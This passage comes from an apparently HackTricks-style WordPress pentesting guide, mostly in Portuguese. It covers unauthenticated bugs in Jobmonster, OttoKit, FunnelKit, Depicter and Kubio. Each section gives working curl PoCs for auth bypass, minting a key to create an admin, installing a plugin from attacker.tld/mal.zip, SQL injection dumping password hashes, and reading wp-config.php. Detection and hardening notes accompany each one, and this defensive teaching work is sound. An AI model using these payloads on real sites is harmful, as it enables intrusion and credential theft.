POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Indicadores de sucesso esperados

- HTTP 200 com corpo JSON como {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* para o usuário vítima; requisições subsequentes são autenticadas.

Encontrando o nome da action

- Inspecione o tema/plugin procurando por registros add_action('wp_ajax_nopriv_...', '...') no código de social login (ex.: framework/add-ons/social-login/class-social-login.php).
- Procure por wp_set_auth_cookie(), get_user_by('email', ...) dentro dos handlers AJAX.

Checklist de detecção

- Web logs mostrando POSTs não autenticados para /wp-admin/admin-ajax.php com a action social-login e id=<email>.
- Respostas 200 com o JSON de sucesso imediatamente antes de tráfego autenticado vindo do mesmo IP/User-Agent.

Endurecimento

- Não derive identidade a partir de entrada do cliente. Aceite apenas emails/IDs que se originem de um token/ID do provedor validado.
- Exija nonces CSRF e checagens de capability mesmo para helpers de login; evite registrar wp_ajax_nopriv_ a menos que estritamente necessário.
- Valide e verifique respostas OAuth/OIDC no servidor; rejeite providers ausentes/inválidos (sem fallback para o POST id).
- Considere desabilitar temporariamente o social login ou aplicar um patch virtual na borda (bloquear a action vulnerável) até corrigir.

Patched behaviour (Jobmonster 4.8.0)

- Removed the insecure fallback from $_POST['id']; $user_email must originate from verified provider branches in switch($_POST['using']).

## Escalada de privilégios não autenticada via emissão de token/chave REST em identidade previsível (OttoKit/SureTriggers ≤ 1.0.82)

Alguns plugins expõem endpoints REST que emitem “connection keys” reutilizáveis ou tokens sem verificar as capacidades do chamador. Se a rota autentica apenas com base em um atributo previsível (ex.: username) e não vincula a chave a um usuário/sessão com checagens de capability, qualquer atacante não autenticado pode emitir uma chave e invocar ações privilegiadas (criação de conta admin, ações de plugin → RCE).

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: comprometimento total ao encadear a chave emitida a ações internas privilegiadas

PoC – emitir uma connection key e usá-la
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# → {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
Por que é explorável
- Rota REST sensível protegida apenas por prova de identidade de baixa entropia (username) ou ausência de permission_callback
- Sem enforcement de capability; a chave emitida é aceita como bypass universal

Checklist de detecção
- Grep o código do plugin por register_rest_route(..., [ 'permission_callback' => '__return_true' ])
- Qualquer rota que emita tokens/chaves com base em identidade fornecida na requisição (username/email) sem vinculá-la a um usuário autenticado ou capability
- Procure rotas subsequentes que aceitem o token/chave emitido sem checagens de capability no lado do servidor

Mitigações
- Para qualquer rota REST privilegiada: exigir permission_callback que aplique current_user_can() para a capability requerida
- Não crie chaves de longa duração a partir de identidade fornecida pelo cliente; se necessário, emita tokens de curta duração vinculados ao usuário após autenticação e reavalie as capabilities no uso
- Valide o contexto de usuário do chamador (wp_set_current_user não é suficiente sozinho) e rejeite requisições onde !is_user_logged_in() || !current_user_can(<cap>)

---

## Uso indevido do Nonce → instalação arbitrária de plugin sem autenticação (FunnelKit Automations ≤ 3.5.3)

Nonces previnem CSRF, não autorização. Se o código trata a aprovação do nonce como sinal verde e então ignora checagens de capability para operações privilegiadas (por exemplo, install/activate plugins), atacantes não autenticados podem satisfazer um requisito de nonce fraco e alcançar RCE instalando um plugin com backdoor ou vulnerável.

- Caminho vulnerável: plugin/install_and_activate
- Falha: verificação fraca do hash do nonce; ausência de current_user_can('install_plugins'|'activate_plugins') uma vez que o nonce “passe”
- Impacto: comprometimento total via instalação/ativação arbitrária de plugins

PoC (shape depends on plugin; illustrative only)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
Detection checklist
- REST/AJAX handlers que modificam plugins/themes usando apenas wp_verify_nonce()/check_admin_referer() e sem verificação de capability
- Qualquer caminho de código que define $skip_caps = true após validação do nonce

Hardening
- Sempre trate nonces apenas como tokens CSRF; aplique verificações de capability independentemente do estado do nonce
- Exigir current_user_can('install_plugins') e current_user_can('activate_plugins') antes de alcançar o código do instalador
- Rejeitar acesso não autenticado; evitar expor nopriv AJAX actions para fluxos privilegiados

---

## SQLi não autenticado via parâmetro s (search) em ações depicter-* (Depicter Slider ≤ 3.6.1)

Múltiplas ações depicter-* consumiam o parâmetro s (search) e o concatenavam em queries SQL sem parametrização.

- Parâmetro: s (search)
- Falha: concatenação direta de strings em cláusulas WHERE/LIKE; sem prepared statements/sanitização
- Impacto: exfiltração do banco de dados (usuários, hashes), movimentação lateral

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
Checklist de detecção
- Grep por depicter-* action handlers e pelo uso direto de $_GET['s'] ou $_POST['s'] em SQL
- Revise consultas customizadas passadas para $wpdb->get_results()/query() que concatenam s

Endurecimento
- Use sempre $wpdb->prepare() ou placeholders do wpdb; rejeite metacaracteres inesperados no servidor
- Adicione uma allowlist estrita para s e normalize para o charset/tamanho esperado

---

## Não autenticado Local File Inclusion via caminho de template/arquivo não validado (Kubio AI Page Builder ≤ 2.5.1)

Aceitar caminhos controlados pelo atacante em um parâmetro de template sem normalização/contenção permite ler arquivos locais arbitrários, e às vezes executar código se arquivos PHP/logs incluíveis forem carregados em tempo de execução.

- Parameter: __kubio-site-edit-iframe-classic-template
- Falha: sem normalização/allowlisting; traversal permitido
- Impacto: divulgação de segredos (wp-config.php), potencial RCE em ambientes específicos (log poisoning, includable PHP)

PoC – ler wp-config.php
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
Checklist de detecção
- Qualquer handler que concatene request paths em sinks include()/require()/read sem contenção via realpath()
- Procure por padrões de traversal (../) que alcancem fora do diretório de templates pretendido

Endurecimento
- Imponha templates permitidos; resolva com realpath() e exija str_starts_with(realpath(file), realpath(allowed_base))
- Normalize a entrada; rejeite sequências de traversal e caminhos absolutos; use sanitize_file_name() somente para nomes de arquivo (não para caminhos completos)


## Referências

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset – delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ≤ 5.6.1 – Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation – Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025’s most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) ≤ 1.0.82 – Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations ≤ 3.5.3 – Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider ≤ 3.6.1 – Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder ≤ 2.5.1 – Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
